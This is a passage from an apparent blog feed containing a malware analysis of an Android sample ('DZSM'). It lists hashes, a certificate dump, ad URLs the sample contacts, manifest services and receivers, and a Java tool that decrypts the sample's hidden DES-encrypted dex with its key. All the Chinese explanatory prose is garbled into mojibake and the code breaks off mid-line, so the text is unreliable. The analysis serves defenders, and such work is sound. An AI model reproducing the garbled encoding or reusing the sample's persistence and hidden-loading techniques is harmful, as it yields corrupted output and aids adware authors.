edx<br>    div ecx<br>    .IF edx == 5<br>        .BREAK<br>    .ENDIF<br>.ENDW<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Malware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DZSM apk æ ·æœ¬åˆ†æ</title>
    <link href="/cn/malware_DZSM/"/>
    <url>/cn/malware_DZSM/</url>
    
    <content type="html"><![CDATA[<h2 id="æ¦‚å†µ"><a href="#æ¦‚å†µ" class="headerlink" title="æ¦‚å†µ"></a>æ¦‚å†µ</h2><ul><li>MD5: 14792786094250715197540fd3b58439</li><li>SHA256: 456caeaaa8346c7a9e2198af5a0ca49d87e616a2603884580df22728a49893d7</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Certificate</span>:<br>    <span class="hljs-attribute">Data</span>:<br>        <span class="hljs-attribute">Version</span>: <span class="hljs-number">3</span> (<span class="hljs-number">0</span>x2)<br>        <span class="hljs-attribute">Serial</span> Number: <span class="hljs-number">1208868505</span> (<span class="hljs-number">0</span>x480dde99)<br>    <span class="hljs-attribute">Signature</span> Algorithm: sha256WithRSAEncryption<br>        <span class="hljs-attribute">Issuer</span>: C=CN, ST=sc, L=sc, O=maizi, OU=maizi, CN=pktool<br>        <span class="hljs-attribute">Validity</span><br>            <span class="hljs-attribute">Not</span> Before: Sep  <span class="hljs-number">9</span> <span class="hljs-number">09</span>:<span class="hljs-number">11</span>:<span class="hljs-number">13</span> <span class="hljs-number">2015</span> GMT<br>            <span class="hljs-attribute">Not</span> After : Jan <span class="hljs-number">25</span> <span class="hljs-number">09</span>:<span class="hljs-number">11</span>:<span class="hljs-number">13</span> <span class="hljs-number">2043</span> GMT<br>        <span class="hljs-attribute">Subject</span>: C=CN, ST=sc, L=sc, O=maizi, OU=maizi, CN=pktool<br>        <span class="hljs-attribute">Subject</span> Public Key Info:<br>            <span class="hljs-attribute">Public</span> Key Algorithm: rsaEncryption<br>                <span class="hljs-attribute">Public</span>-Key: (<span class="hljs-number">2048</span> bit)<br>                <span class="hljs-attribute">Modulus</span>:<br>                    <span class="hljs-attribute">00</span>:<span class="hljs-number">93</span>:<span class="hljs-number">57</span>:<span class="hljs-number">2</span>d:<span class="hljs-number">52</span>:af:c1:<span class="hljs-number">71</span>:cf:<span class="hljs-number">7</span>a:cb:<span class="hljs-number">2</span>f:<span class="hljs-number">6</span>a:<span class="hljs-number">6</span>c:<span class="hljs-number">0</span>a:<br>                    <span class="hljs-attribute">b2</span>:<span class="hljs-number">3</span>f:<span class="hljs-number">4</span>b:<span class="hljs-number">60</span>:a6:a7:d0:<span class="hljs-number">9</span>d:ba:<span class="hljs-number">36</span>:a1:<span class="hljs-number">0</span>f:<span class="hljs-number">0</span>d:cc:<span class="hljs-number">9</span>e:<br>                    <span class="hljs-attribute">32</span>:ea:<span class="hljs-number">23</span>:df:<span class="hljs-number">80</span>:a3:b3:<span class="hljs-number">9</span>f:<span class="hljs-number">2</span>b:<span class="hljs-number">93</span>:b9:<span class="hljs-number">53</span>:c4:e5:bf:<br>                    <span class="hljs-attribute">05</span>:<span class="hljs-number">32</span>:<span class="hljs-number">21</span>:<span class="hljs-number">23</span>:c1:<span class="hljs-number">13</span>:<span class="hljs-number">78</span>:b0:<span class="hljs-number">72</span>:<span class="hljs-number">08</span>:<span class="hljs-number">19</span>:<span class="hljs-number">8</span>e:<span class="hljs-number">5</span>e:c0:a0:<br>                    <span class="hljs-attribute">13</span>:<span class="hljs-number">11</span>:<span class="hljs-number">19</span>:d6:<span class="hljs-number">23</span>:<span class="hljs-number">8</span>a:b6:<span class="hljs-number">44</span>:<span class="hljs-number">2</span>b:<span class="hljs-number">73</span>:e0:<span class="hljs-number">1</span>d:f3:b3:f4:<br>                    <span class="hljs-attribute">ab</span>:<span class="hljs-number">6</span>c:<span class="hljs-number">2</span>e:af:<span class="hljs-number">78</span>:<span class="hljs-number">2</span>f:<span class="hljs-number">8</span>b:e2:dc:b0:d6:<span class="hljs-number">06</span>:af:<span class="hljs-number">8</span>e:<span class="hljs-number">3</span>f:<br>                    <span class="hljs-attribute">29</span>:<span class="hljs-number">54</span>:<span class="hljs-number">1</span>a:<span class="hljs-number">59</span>:<span class="hljs-number">44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">73</span>:<span class="hljs-number">98</span>:<span class="hljs-number">2</span>f:fd:<span class="hljs-number">8</span>b:<span class="hljs-number">18</span>:b0:de:c6:<br>                    <span class="hljs-attribute">9c</span>:ee:<span class="hljs-number">0</span>c:c7:f7:<span class="hljs-number">04</span>:<span class="hljs-number">9</span>d:<span class="hljs-number">0</span>c:a7:<span class="hljs-number">62</span>:<span class="hljs-number">06</span>:<span class="hljs-number">45</span>:<span class="hljs-number">4</span>f:<span class="hljs-number">08</span>:<span class="hljs-number">20</span>:<br>                    <span class="hljs-attribute">2e</span>:ca:a9:<span class="hljs-number">20</span>:<span class="hljs-number">88</span>:<span class="hljs-number">0</span>e:<span class="hljs-number">08</span>:<span class="hljs-number">2</span>b:f1:<span class="hljs-number">9</span>c:a9:<span class="hljs-number">24</span>:<span class="hljs-number">5</span>d:<span class="hljs-number">35</span>:<span class="hljs-number">85</span>:<br>                    <span class="hljs-attribute">02</span>:bb:c0:ff:<span class="hljs-number">37</span>:<span class="hljs-number">98</span>:<span class="hljs-number">4</span>b:c7:<span class="hljs-number">6</span>f:f2:<span class="hljs-number">75</span>:<span class="hljs-number">81</span>:<span class="hljs-number">43</span>:<span class="hljs-number">78</span>:f8:<br>                    <span class="hljs-attribute">4b</span>:cc:<span class="hljs-number">63</span>:<span class="hljs-number">8</span>c:f5:<span class="hljs-number">0</span>e:c9:<span class="hljs-number">95</span>:<span class="hljs-number">05</span>:<span class="hljs-number">3</span>d:ee:a1:<span class="hljs-number">85</span>:cd:<span class="hljs-number">94</span>:<br>                    <span class="hljs-attribute">97</span>:b8:<span class="hljs-number">48</span>:<span class="hljs-number">93</span>:<span class="hljs-number">02</span>:b3:<span class="hljs-number">71</span>:<span class="hljs-number">6</span>e:fb:<span class="hljs-number">39</span>:<span class="hljs-number">6</span>f:<span class="hljs-number">63</span>:<span class="hljs-number">5</span>d:a7:<span class="hljs-number">24</span>:<br>                    <span class="hljs-attribute">c1</span>:dc:<span class="hljs-number">77</span>:a9:<span class="hljs-number">9</span>c:de:<span class="hljs-number">5</span>d:<span class="hljs-number">76</span>:<span class="hljs-number">63</span>:a8:ad:<span class="hljs-number">1</span>d:e9:d6:<span class="hljs-number">84</span>:<br>                    <span class="hljs-attribute">9b</span>:ee:<span class="hljs-number">8</span>d:<span class="hljs-number">37</span>:<span class="hljs-number">38</span>:<span class="hljs-number">4</span>b:<span class="hljs-number">7</span>c:ff:<span class="hljs-number">94</span>:c9:df:dd:<span class="hljs-number">17</span>:<span class="hljs-number">80</span>:<span class="hljs-number">8</span>c:<br>                    <span class="hljs-attribute">e8</span>:d1:<span class="hljs-number">94</span>:<span class="hljs-number">5</span>d:<span class="hljs-number">05</span>:dc:ef:d8:dc:<span class="hljs-number">90</span>:<span class="hljs-number">4</span>c:<span class="hljs-number">8</span>b:<span class="hljs-number">75</span>:<span class="hljs-number">22</span>:<span class="hljs-number">6</span>d:<br>                    <span class="hljs-attribute">57</span>:<span class="hljs-number">6</span>e:ee:<span class="hljs-number">4</span>c:<span class="hljs-number">5</span>f:<span class="hljs-number">62</span>:<span class="hljs-number">96</span>:<span class="hljs-number">5</span>c:<span class="hljs-number">72</span>:<span class="hljs-number">64</span>:a4:<span class="hljs-number">5</span>b:<span class="hljs-number">0</span>f:<span class="hljs-number">29</span>:e0:<br>                    <span class="hljs-attribute">f3</span>:<span class="hljs-number">31</span>:<span class="hljs-number">11</span>:<span class="hljs-number">99</span>:<span class="hljs-number">6</span>a:b4:e5:<span class="hljs-number">6</span>c:<span class="hljs-number">16</span>:<span class="hljs-number">4</span>d:<span class="hljs-number">8</span>a:<span class="hljs-number">44</span>:<span class="hljs-number">46</span>:<span class="hljs-number">06</span>:<span class="hljs-number">8</span>f:<br>                    <span class="hljs-attribute">06</span>:<span class="hljs-number">05</span><br>                <span class="hljs-attribute">Exponent</span>: <span class="hljs-number">65537</span> (<span class="hljs-number">0</span>x10001)<br>        <span class="hljs-attribute">X509v3</span> extensions:<br>            <span class="hljs-attribute">X509v3</span> Subject Key Identifier: <br>                <span class="hljs-attribute">A6</span>:<span class="hljs-number">8</span>F:<span class="hljs-number">86</span>:BB:A7:<span class="hljs-number">0</span>A:DB:<span class="hljs-number">29</span>:<span class="hljs-number">2</span>E:E9:<span class="hljs-number">26</span>:A6:F1:<span class="hljs-number">8</span>C:BF:<span class="hljs-number">2</span>F:<span class="hljs-number">4</span>B:<span class="hljs-number">58</span>:<span class="hljs-number">99</span>:<span class="hljs-number">39</span><br>    <span class="hljs-attribute">Signature</span> Algorithm: sha256WithRSAEncryption<br>         <span class="hljs-attribute">82</span>:<span class="hljs-number">62</span>:<span class="hljs-number">98</span>:a8:<span class="hljs-number">39</span>:<span class="hljs-number">10</span>:<span class="hljs-number">3</span>b:f5:<span class="hljs-number">09</span>:<span class="hljs-number">42</span>:<span class="hljs-number">97</span>:de:e9:<span class="hljs-number">4</span>c:<span class="hljs-number">57</span>:<span class="hljs-number">6</span>c:<span class="hljs-number">4</span>e:<span class="hljs-number">58</span>:<br>         <span class="hljs-attribute">a3</span>:<span class="hljs-number">1</span>a:<span class="hljs-number">31</span>:<span class="hljs-number">29</span>:a4:<span class="hljs-number">79</span>:<span class="hljs-number">98</span>:<span class="hljs-number">3</span>f:c9:<span class="hljs-number">68</span>:<span class="hljs-number">3</span>c:e5:<span class="hljs-number">90</span>:be:<span class="hljs-number">7</span>f:b0:<span class="hljs-number">98</span>:<span class="hljs-number">2</span>b:<br>         <span class="hljs-attribute">8f</span>:<span class="hljs-number">95</span>:<span class="hljs-number">9</span>e:<span class="hljs-number">4</span>e:d2:bc:<span class="hljs-number">82</span>:<span class="hljs-number">6</span>e:bf:<span class="hljs-number">32</span>:<span class="hljs-number">56</span>:<span class="hljs-number">35</span>:<span class="hljs-number">87</span>:c8:<span class="hljs-number">19</span>:<span class="hljs-number">08</span>:ae:af:<br>         <span class="hljs-attribute">9c</span>:db:<span class="hljs-number">94</span>:<span class="hljs-number">71</span>:d4:db:<span class="hljs-number">73</span>:d9:<span class="hljs-number">25</span>:e2:e5:f1:<span class="hljs-number">92</span>:a0:a4:c4:bd:<span class="hljs-number">27</span>:<br>         <span class="hljs-attribute">21</span>:b2:c8:ec:e2:<span class="hljs-number">2</span>a:c3:bb:a2:<span class="hljs-number">85</span>:<span class="hljs-number">97</span>:<span class="hljs-number">78</span>:<span class="hljs-number">2</span>b:<span class="hljs-number">4</span>a:<span class="hljs-number">94</span>:cc:fc:dc:<br>         <span class="hljs-attribute">75</span>:<span class="hljs-number">6</span>a:<span class="hljs-number">11</span>:c8:ba:da:<span class="hljs-number">30</span>:be:<span class="hljs-number">11</span>:e9:e7:<span class="hljs-number">4</span>a:<span class="hljs-number">5</span>e:e1:ae:af:<span class="hljs-number">4</span>d:<span class="hljs-number">36</span>:<br>         <span class="hljs-attribute">14</span>:<span class="hljs-number">69</span>:<span class="hljs-number">31</span>:ab:<span class="hljs-number">68</span>:<span class="hljs-number">16</span>:<span class="hljs-number">69</span>:ed:a8:bb:c7:be:bf:<span class="hljs-number">8</span>b:ca:<span class="hljs-number">4</span>c:<span class="hljs-number">01</span>:d0:<br>         <span class="hljs-attribute">7e</span>:<span class="hljs-number">65</span>:<span class="hljs-number">45</span>:<span class="hljs-number">31</span>:<span class="hljs-number">72</span>:<span class="hljs-number">0</span>f:<span class="hljs-number">7</span>b:<span class="hljs-number">8</span>d:<span class="hljs-number">7</span>e:<span class="hljs-number">76</span>:<span class="hljs-number">40</span>:<span class="hljs-number">86</span>:<span class="hljs-number">45</span>:<span class="hljs-number">8</span>d:ee:a3:b2:ee:<br>         <span class="hljs-attribute">ac</span>:d3:<span class="hljs-number">0</span>e:<span class="hljs-number">60</span>:<span class="hljs-number">29</span>:b0:fd:dc:<span class="hljs-number">8</span>c:<span class="hljs-number">6</span>a:<span class="hljs-number">25</span>:<span class="hljs-number">06</span>:<span class="hljs-number">01</span>:<span class="hljs-number">99</span>:<span class="hljs-number">81</span>:<span class="hljs-number">96</span>:f5:<span class="hljs-number">4</span>c:<br>         <span class="hljs-attribute">1d</span>:<span class="hljs-number">1</span>a:<span class="hljs-number">1</span>d:dc:<span class="hljs-number">0</span>e:<span class="hljs-number">4</span>b:<span class="hljs-number">66</span>:<span class="hljs-number">15</span>:<span class="hljs-number">80</span>:e8:f5:<span class="hljs-number">1</span>c:cd:<span class="hljs-number">98</span>:<span class="hljs-number">60</span>:<span class="hljs-number">71</span>:<span class="hljs-number">08</span>:de:<br>         <span class="hljs-attribute">f9</span>:<span class="hljs-number">4</span>f:<span class="hljs-number">69</span>:b0:<span class="hljs-number">22</span>:ec:<span class="hljs-number">05</span>:<span class="hljs-number">18</span>:<span class="hljs-number">6</span>b:cd:<span class="hljs-number">5</span>a:<span class="hljs-number">05</span>:ce:<span class="hljs-number">3</span>a:fe:<span class="hljs-number">57</span>:<span class="hljs-number">4</span>b:e7:<br>         <span class="hljs-attribute">8b</span>:<span class="hljs-number">64</span>:b4:f7:<span class="hljs-number">4</span>a:cd:<span class="hljs-number">63</span>:c1:<span class="hljs-number">03</span>:<span class="hljs-number">01</span>:e2:b0:aa:<span class="hljs-number">81</span>:<span class="hljs-number">2</span>d:<span class="hljs-number">89</span>:e1:<span class="hljs-number">4</span>d:<br>         <span class="hljs-attribute">da</span>:fb:<span class="hljs-number">8</span>f:b9:<span class="hljs-number">37</span>:<span class="hljs-number">02</span>:ad:<span class="hljs-number">85</span>:<span class="hljs-number">64</span>:de:<span class="hljs-number">87</span>:<span class="hljs-number">73</span>:<span class="hljs-number">1</span>a:<span class="hljs-number">7</span>a:<span class="hljs-number">36</span>:<span class="hljs-number">50</span>:<span class="hljs-number">3</span>f:e6:<br>         <span class="hljs-attribute">9a</span>:<span class="hljs-number">73</span>:<span class="hljs-number">65</span>:a0:<span class="hljs-number">33</span>:af:<span class="hljs-number">81</span>:c6:c8:<span class="hljs-number">55</span>:<span class="hljs-number">89</span>:e6:a8:<span class="hljs-number">03</span>:<span class="hljs-number">6</span>a:c6:da:f0:<br>         <span class="hljs-attribute">a5</span>:cc:<span class="hljs-number">1</span>c:<span class="hljs-number">6</span>e<br></code></pre></td></tr></table></figure><p>æ ·æœ¬é€šè¿‡apktoolé‡æ‰“åŒ…æ¿€æƒ…æµè§ˆå™¨ï¼Œå¼•è¯±ä¸‹è½½è¾¾åˆ°æ„ŸæŸ“çš„ç›®çš„ã€‚æ ·æœ¬å®‰è£…åå¯åŠ¨ä¸¤ä¸ªæœåŠ¡å¸¸é©»æ‰‹æœºï¼Œ é€šè¿‡å¹¿å‘Šæ¥è·å¾—ç»æµæ”¶ç›Š,å®‰è£…åº”ç”¨åè®¿é—®ä»¥ä¸‹é“¾æ¥ï¼š</p><p><a href="http://dw.cnscns.com/upload/adIcon/2015-10-07/55c01eff-e66a-4186-9658-977d025c5395.png">http://dw.cnscns.com/upload/adIcon/2015-10-07/55c01eff-e66a-4186-9658-977d025c5395.png</a><br><a href="http://dw.cnscns.com/upload/adOnline/2015-10-07/db90fe85-dd23-4674-9bbc-767c978acb8c.jpg">http://dw.cnscns.com/upload/adOnline/2015-10-07/db90fe85-dd23-4674-9bbc-767c978acb8c.jpg</a><br><a href="http://dw.cnscns.com/upload/adIcon/2015-09-06/eccb1bfd-7c3a-44a3-bfc8-e559eb995b49.png">http://dw.cnscns.com/upload/adIcon/2015-09-06/eccb1bfd-7c3a-44a3-bfc8-e559eb995b49.png</a><br><a href="http://dw.cnscns.com/upload/adOnline/2015-09-06/2cd2516c-6f55-4d99-8913-e121fd34abbd.jpg">http://dw.cnscns.com/upload/adOnline/2015-09-06/2cd2516c-6f55-4d99-8913-e121fd34abbd.jpg</a><br><a href="http://dw.cnscns.com/upload/adIcon/2015-06-18/a7a41435-51e6-4a02-8bb5-1d96edf1a403.png">http://dw.cnscns.com/upload/adIcon/2015-06-18/a7a41435-51e6-4a02-8bb5-1d96edf1a403.png</a><br><a href="http://dw.cnscns.com/upload/adOnline/2015-09-19/2e3fe3ec-8043-4a03-ac6d-6b815dc2c144.jpg">http://dw.cnscns.com/upload/adOnline/2015-09-19/2e3fe3ec-8043-4a03-ac6d-6b815dc2c144.jpg</a></p><p><a href="http://dw.cnscns.com/">http://dw.cnscns.com</a> æ˜¯ä¸€ä¸ªç§»åŠ¨å¹¿å‘Šå¹³å°ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å…³é”®çš„åœ°æ–¹æ˜¯ä¸¤ä¸ªserviceå’Œä¸€ä¸ªReceiver</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;net.tend.dot.DZS&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;net.tend.dot.DZK&quot;</span> <span class="hljs-attr">android:process</span>=<span class="hljs-string">&quot;:daemon&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:configChanges</span>=<span class="hljs-string">&quot;keyboard|keyboardHidden|orientation|screenSize&quot;</span> <span class="hljs-attr">android:excludeFromRecents</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:launchMode</span>=<span class="hljs-string">&quot;singleInstance&quot;</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;net.tend.dot.DZA&quot;</span> <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@android:style/Theme.Translucent.NoTitleBar&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;net.tend.dot.DZR&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.USER_PRESENT&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.dz.downloadmanager&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;action.dz.start&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.PACKAGE_ADDED&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.PACKAGE_REMOVED&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">android:scheme</span>=<span class="hljs-string">&quot;package&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸¤ä¸ªServiceå’ŒReceiverçš„ä»£ç å¹¶ä¸åœ¨Appä»£ç ä¸­ï¼Œè€Œæ˜¯åœ¨åŠ¨æ€åŠ è½½çš„dexä¸­ï¼Œå…¶ä¸­çš„å¯¹äºå…³ç³»å¦‚ä¸‹ï¼š</p><p>net.tend.dot.DZS -&gt; mkit.dz.vol.MFSS<br>net.tend.dot.DZK -&gt; mkit.dz.vol.MFKS<br>net.tend.dot.DZR -&gt; mkit.dz.vol.MFBR<br>net.tent.dot.DZA -&gt; mkit.dz.vol.MFAC</p><p>è€ŒåŠ¨æ€åŠ è½½çš„dex ç”± assets&#x2F;dzsm è§£å¯†è€Œæ¥ã€‚æ ·æœ¬çš„æ–‡ä»¶è½¬æ¢å›¾å¦‚ä¸‹ï¼š</p><p><img src="http://3.bp.blogspot.com/-0zIRKQXPbQE/VihzlM73gKI/AAAAAAAABaQ/7Tk8fxcZtGM/s320/loaddex.png" alt="convert"></p><p>assets&#x2F;dzsm ä½¿ç”¨DESåŠ å¯†ï¼Œæ–‡ä»¶çš„å‰32ä¸ªå­—èŠ‚ä¸ºkeyï¼Œåé¢çš„ä¸ºåŠ å¯†çš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„javaä»£ç è¿›è¡Œ è§£å¯†ã€‚è§£å¯†å‡ºæ¥çš„æ–‡ä»¶ä¸ºdexæ–‡ä»¶ï¼Œå¯ä»¥ç”¨jebæ­£å¸¸åˆ†æã€‚</p><p><img src="http://3.bp.blogspot.com/-Xhfy3x0z8DM/VihzreBFJ7I/AAAAAAAABaY/-LEsqtwWxbY/s1600/2015-10-22_09-10-04.png" alt="encrypt"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.CipherInputStream;<br><span class="hljs-keyword">import</span> javax.crypto.CipherOutputStream;<br><span class="hljs-keyword">import</span> javax.crypto.SecretKey;<br><span class="hljs-keyword">import</span> javax.crypto.SecretKeyFactory;<br><span class="hljs-keyword">import</span> javax.crypto.spec.DESKeySpec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">decrypt</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;8q6e81ssaiem1msqii9ixasmumsxxxqq&quot;</span>;<br><br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;/tmp/dzsm&quot;</span>);<br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;decrypted&quot;</span>);<br>            decrypt(key, fis2, fos2);<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">encrypt</span><span class="hljs-params">(String key, InputStream is, OutputStream os)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        encryptOrDecrypt(key, Cipher.ENCRYPT_MODE, is, os);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(String key, InputStream is, OutputStream os)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        encryptOrDecrypt(key, Cipher.DECRYPT_MODE, is, os);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">encryptOrDecrypt</span><span class="hljs-params">(String key, <span class="hljs-type">int</span> mode, InputStream is, OutputStream os)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br><br>        <span class="hljs-type">DESKeySpec</span> <span class="hljs-variable">dks</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DESKeySpec</span>(key.getBytes());<br>        <span class="hljs-type">SecretKeyFactory</span> <span class="hljs-variable">skf</span> <span class="hljs-operator">=</span> SecretKeyFactory.getInstance(<span class="hljs-string">&quot;DES&quot;</span>);<br>        <span class="hljs-type">SecretKey</span> <span class="hljs-variable">desKey</span> <span class="hljs-operator">=</span> skf.generateSecret(dks);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;DES&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (mode == Cipher.ENCRYPT_MODE) &#123;<br>            cipher.init(Cipher.ENCRYPT_MODE, desKey);<br>            <span class="hljs-type">CipherInputStream</span> <span class="hljs-variable">cis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CipherInputStream</span>(is, cipher);<br>            doCopy(cis, os);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == Cipher.DECRYPT_MODE) &#123;<br>            cipher.init(Cipher.DECRYPT_MODE, desKey);<br>            <span class="hljs-type">CipherOutputStream</span> <span class="hljs-variable">cos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CipherOutputStream</span>(os, cipher);<br>            doCopy(is, cos);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doCopy</span><span class="hljs-params">(InputStream is, OutputStream os)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">64</span>];<br>        <span class="hljs-type">int</span> numBytes;<br>        <span class="hljs-keyword">while</span> ((numBytes = is.read(bytes)) != -<span 